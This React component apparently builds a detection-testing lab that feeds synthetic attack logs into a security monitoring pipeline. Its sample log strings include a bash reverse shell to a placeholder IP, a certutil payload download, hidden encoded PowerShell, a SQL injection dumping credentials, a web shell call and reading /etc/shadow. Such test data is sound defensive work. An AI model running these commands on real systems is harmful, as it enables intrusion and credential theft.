import React, { useState } from 'react';
import { Modal } from '../common/Modal';
import { eventsApi } from '../../api/events';
import { cyberAudio } from '../../utils/cyberAudio';
import {
  Play,
  Zap,
  CheckCircle2,
  AlertTriangle,
  ShieldCheck,
  Terminal,
  Globe,
  Radio,
  Cpu,
  Flame,
  Volume2,
  VolumeX,
} from 'lucide-react';

interface Props {
  isOpen: boolean;
  onClose: () => void;
  onRefreshData?: () => void;
}

export const SimulatorModal: React.FC<Props> = ({ isOpen, onClose, onRefreshData }) => {
  const [loading, setLoading] = useState(false);
  const [logOutputs, setLogOutputs] = useState<string[]>([]);
  const [selectedScenario, setSelectedScenario] = useState<string>('LAB-03');
  const [muted, setMuted] = useState(cyberAudio.getMuted());

  const scenarios = [
    {
      id: 'LAB-01',
      name: 'SSH Brute Force',
      category: 'Authentication',
      desc: 'Repeated failed SSH logins (5x) from external attacker IP.',
      icon: Zap,
      color: 'text-orange-400',
    },
    {
      id: 'LAB-02',
      name: 'Password Spraying',
      category: 'Credential Access',
      desc: 'Low-and-slow authentication failures distributed across 5 user accounts.',
      icon: AlertTriangle,
      color: 'text-amber-400',
    },
    {
      id: 'LAB-03',
      name: 'Full Compromise Chain',
      category: 'Multi-Stage Attack',
      desc: 'Auth failures -> Login Success -> Sudo Root -> C2 Reverse Shell.',
      icon: Flame,
      color: 'text-red-400',
    },
    {
      id: 'LAB-04',
      name: 'Privilege Escalation',
      category: 'Privilege',
      desc: 'Controlled Linux PAM / Sudo root transition execution.',
      icon: ShieldCheck,
      color: 'text-purple-400',
    },
    {
      id: 'LAB-05',
      name: 'Obfuscated LOLBin Exec',
      category: 'Execution',
      desc: 'Encoded base64 payload execution and certutil download cradle.',
      icon: Terminal,
      color: 'text-cyan-400',
    },
    {
      id: 'LAB-06',
      name: 'Web Application Exploit',
      category: 'Initial Access',
      desc: 'SQL Injection UNION SELECT followed by Web Shell upload and access.',
      icon: Globe,
      color: 'text-emerald-400',
    },
    {
      id: 'LAB-07',
      name: 'Malicious IOC & C2',
      category: 'Command & Control',
      desc: 'Outbound socket communication to known Cobalt Strike C2 IP.',
      icon: Radio,
      color: 'text-red-400',
    },
    {
      id: 'LAB-08',
      name: 'DNS Tunneling & Beacon',
      category: 'Exfiltration',
      desc: 'High-entropy DNS exfiltration queries and regular beacon heartbeat.',
      icon: Cpu,
      color: 'text-cyan-300',
    },
  ];

  const handleToggleSound = () => {
    const isMuted = cyberAudio.toggleMute();
    setMuted(isMuted);
  };

  const runSimulation = async (scenarioId: string) => {
    setLoading(true);
    setLogOutputs([]);
    const outputs: string[] = [];

    cyberAudio.playScan();

    const addLog = (msg: string) => {
      outputs.push(msg);
      setLogOutputs([...outputs]);
    };

    try {
      addLog(`[INIT] Starting Validation Scenario ${scenarioId}...`);

      if (scenarioId === 'LAB-01') {
        addLog('[-] Injecting 5 rapid SSH failure events on srv-linux-01 from 198.51.100.77...');
        for (let i = 1; i <= 5; i++) {
          const raw = `Aug 22 21:05:1${i} srv-linux-01 sshd[1299]: Failed password for invalid user root from 198.51.100.77 port 4810${i} ssh2`;
          const res = await eventsApi.ingestLog('linux-auth', raw, 'srv-linux-01');
          addLog(`[+] Event ${i}/5 Ingested (ID: ${res.event_id}) -> Generated Alerts: ${res.alerts_generated}`);
          cyberAudio.playClick();
          await new Promise((r) => setTimeout(r, 180));
        }
      } else if (scenarioId === 'LAB-02') {
        addLog('[-] Injecting distributed password spray across admin, devops, deploy, backup, secops...');
        for (const u of ['admin', 'devops', 'deploy', 'backup', 'secops']) {
          const raw = `Aug 22 21:06:00 corp-dc-01 sshd[2201]: Failed password for ${u} from 198.51.100.77 port 51200 ssh2`;
          const res = await eventsApi.ingestLog('linux-auth', raw, 'corp-dc-01');
          addLog(`[+] Spray probe against user '${u}' -> Ingested (Alerts: ${res.alerts_generated})`);
          cyberAudio.playClick();
          await new Promise((r) => setTimeout(r, 180));
        }
      } else if (scenarioId === 'LAB-03') {
        addLog('[-] Step 1: Multiple failed SSH attempts...');
        for (let i = 1; i <= 3; i++) {
          const raw = `Aug 22 21:07:0${i} db-prod-01 sshd[1400]: Failed password for invalid user deploy from 198.51.100.77 port 3910${i} ssh2`;
          await eventsApi.ingestLog('linux-auth', raw, 'db-prod-01');
          addLog(`[+] SSH failure #${i} logged.`);
          await new Promise((r) => setTimeout(r, 150));
        }

        addLog('[-] Step 2: Successful SSH login with compromised credentials...');
        const loginRaw = 'Aug 22 21:07:15 db-prod-01 sshd[1405]: Accepted password for deploy from 198.51.100.77 port 39110 ssh2';
        const loginRes = await eventsApi.ingestLog('linux-auth', loginRaw, 'db-prod-01');
        addLog(`[+] Login success registered -> Alerts: ${loginRes.alerts_generated}`);
        cyberAudio.playAlarm();

        addLog('[-] Step 3: Sudo root privilege escalation...');
        const sudoRaw = 'Aug 22 21:07:20 db-prod-01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash';
        const sudoRes = await eventsApi.ingestLog('linux-auth', sudoRaw, 'db-prod-01');
        addLog(`[+] Sudo root execution registered -> Alerts: ${sudoRes.alerts_generated}`);

        addLog('[-] Step 4: C2 Reverse shell process spawn...');
        const shellRaw = '{"host":"db-prod-01","process":"/bin/bash -i >& /dev/tcp/198.51.100.77/4444 0>&1","pid":9841,"user":"root","event_type":"suspicious_process","severity":"critical"}';
        const shellRes = await eventsApi.ingestLog('custom', shellRaw, 'db-prod-01');
        addLog(`[+] Critical C2 Reverse Shell logged -> Alerts: ${shellRes.alerts_generated}`);
      } else if (scenarioId === 'LAB-04') {
        addLog('[-] Injecting Sudo Root privilege escalation telemetry on srv-app-02...');
        const sudoRaw = 'Aug 22 21:08:00 srv-app-02 sudo: analyst : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow';
        const res = await eventsApi.ingestLog('linux-auth', sudoRaw, 'srv-app-02');
        addLog(`[+] Privilege escalation event ingested -> Generated Alerts: ${res.alerts_generated}`);
      } else if (scenarioId === 'LAB-05') {
        addLog('[-] Injecting base64 obfuscated command execution & LOLBin download...');
        const raw1 = '{"host":"win-srv-01","command":"certutil -urlcache -split -f http://198.51.100.77/payload.exe C:\\\\temp\\\\payload.exe","event_type":"suspicious_lolbin","severity":"high"}';
        const res1 = await eventsApi.ingestLog('custom', raw1, 'win-srv-01');
        addLog(`[+] LOLBin download logged -> Alerts: ${res1.alerts_generated}`);

        const raw2 = '{"host":"win-srv-01","command":"powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=","event_type":"obfuscated_command","severity":"high"}';
        const res2 = await eventsApi.ingestLog('custom', raw2, 'win-srv-01');
        addLog(`[+] Obfuscated PowerShell execution logged -> Alerts: ${res2.alerts_generated}`);
      } else if (scenarioId === 'LAB-06') {
        addLog('[-] Step 1: SQL Injection attempt on web-portal-01...');
        const raw1 = '203.0.113.99 - - [22/Aug/2026:21:09:00 +0000] "GET /products.php?id=1%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1" 200 4510 "-" "sqlmap/1.7"';
        const res1 = await eventsApi.ingestLog('nginx', raw1, 'web-portal-01');
        addLog(`[+] SQLi probe ingested -> Alerts: ${res1.alerts_generated}`);

        addLog('[-] Step 2: Web shell backdoor invocation...');
        const raw2 = '203.0.113.99 - - [22/Aug/2026:21:09:15 +0000] "POST /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 24 "-" "Mozilla/5.0"';
        const res2 = await eventsApi.ingestLog('nginx', raw2, 'web-portal-01');
        addLog(`[+] Web Shell activity ingested -> Alerts: ${res2.alerts_generated}`);
      } else if (scenarioId === 'LAB-07') {
        addLog('[-] Injecting Outbound Network telemetry connecting to known APT-29 C2 IP...');
        const raw = '{"host":"db-prod-01","source_ip":"198.51.100.77","destination_port":443,"event_type":"malicious_ioc_traffic","severity":"critical","threat_intel_match":"198.51.100.77 (APT-29)"}';
        const res = await eventsApi.ingestLog('custom', raw, 'db-prod-01');
        addLog(`[+] Malicious IOC traffic event ingested -> Alerts: ${res.alerts_generated}`);
      } else if (scenarioId === 'LAB-08') {
        addLog('[-] Injecting DNS Tunneling exfiltration & C2 periodic heartbeat...');
        const raw1 = '{"host":"corp-workstation-09","event_type":"dns_tunneling_suspicion","query":"aW5maWwucGFzc3dvcmRzLmRhdGE.c2.darknet-tunnel.org","severity":"high"}';
        const res1 = await eventsApi.ingestLog('custom', raw1, 'corp-workstation-09');
        addLog(`[+] DNS Tunneling event logged -> Alerts: ${res1.alerts_generated}`);

        const raw2 = '{"host":"corp-workstation-09","event_type":"c2_beaconing","destination_ip":"198.51.100.77","interval_seconds":30,"severity":"high"}';
        const res2 = await eventsApi.ingestLog('custom', raw2, 'corp-workstation-09');
        addLog(`[+] C2 Beaconing heartbeat logged -> Alerts: ${res2.alerts_generated}`);
      }

      cyberAudio.playSuccess();
      addLog('[SUCCESS] Attack sequence finished! Correlated incidents generated.');
      if (onRefreshData) onRefreshData();
    } catch (err: any) {
      addLog(`[ERROR] Injection failed: ${err.message || err}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Cyber Attack Validation Lab & Telemetry Generator" maxWidth="max-w-4xl">
      <div className="space-y-4">
        {/* Header Controls */}
        <div className="flex items-center justify-between">
          <p className="text-xs text-slate-400 font-mono">
            Execute controlled attack scenarios to test ingestion parsing, rule firing, and incident correlation.
          </p>
          <button
            onClick={handleToggleSound}
            className="flex items-center gap-1.5 px-2.5 py-1 rounded bg-slate-900 border border-slate-800 text-[10px] font-mono text-cyan-400 hover:border-cyan-500/50 transition-colors"
          >
            {muted ? <VolumeX className="w-3.5 h-3.5 text-slate-500" /> : <Volume2 className="w-3.5 h-3.5 text-cyan-400" />}
            <span>{muted ? 'Audio: OFF' : 'Audio: ON'}</span>
          </button>
        </div>

        {/* 8 Attack Scenarios Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
          {scenarios.map((sc) => {
            const isSelected = selectedScenario === sc.id;
            return (
              <button
                key={sc.id}
                onClick={() => {
                  setSelectedScenario(sc.id);
                  cyberAudio.playClick();
                }}
                className={`p-3 rounded-xl border text-left transition-all relative overflow-hidden group ${
                  isSelected
                    ? 'bg-cyan-500/15 border-cyan-400/80 text-cyan-200 shadow-glow-cyan'
                    : 'cyber-card text-slate-300 hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[10px] font-mono font-bold text-cyan-400 bg-cyan-950/60 px-1.5 py-0.5 rounded border border-cyan-500/30">
                    {sc.id}
                  </span>
                  <sc.icon className={`w-4 h-4 ${sc.color}`} />
                </div>
                <div className="font-mono text-xs font-bold text-slate-100 mb-1 leading-tight">
                  {sc.name}
                </div>
                <div className="text-[10px] text-slate-400 line-clamp-2 leading-relaxed">
                  {sc.desc}
                </div>
              </button>
            );
          })}
        </div>

        {/* Execute Simulation Action */}
        <button
          disabled={loading}
          onClick={() => runSimulation(selectedScenario)}
          className="w-full py-3 bg-gradient-to-r from-red-600 to-rose-500 hover:from-red-500 hover:to-rose-400 text-white font-mono font-bold text-xs rounded-xl transition-all flex items-center justify-center gap-2 shadow-glow-red disabled:opacity-50"
        >
          <Play className="w-4 h-4 fill-current animate-pulse" />
          {loading ? 'Injecting Telemetry Streams into Pipeline...' : `Execute Scenario [${selectedScenario}]`}
        </button>

        {/* Live Terminal Log Stream */}
        {logOutputs.length > 0 && (
          <div className="bg-[#03060c] rounded-xl p-4 font-mono text-xs text-emerald-400 border border-slate-800 max-h-56 overflow-y-auto space-y-1.5 shadow-inner">
            <div className="text-[10px] text-slate-500 pb-1 border-b border-slate-800/80 flex items-center justify-between">
              <span>EYE-INGEST-STREAM://stdout</span>
              <span className="text-cyan-400">STATUS: LIVE</span>
            </div>
            {logOutputs.map((msg, i) => (
              <div key={i} className="leading-relaxed font-mono text-[11px]">
                {msg}
              </div>
            ))}
          </div>
        )}
      </div>
    </Modal>
  );
};
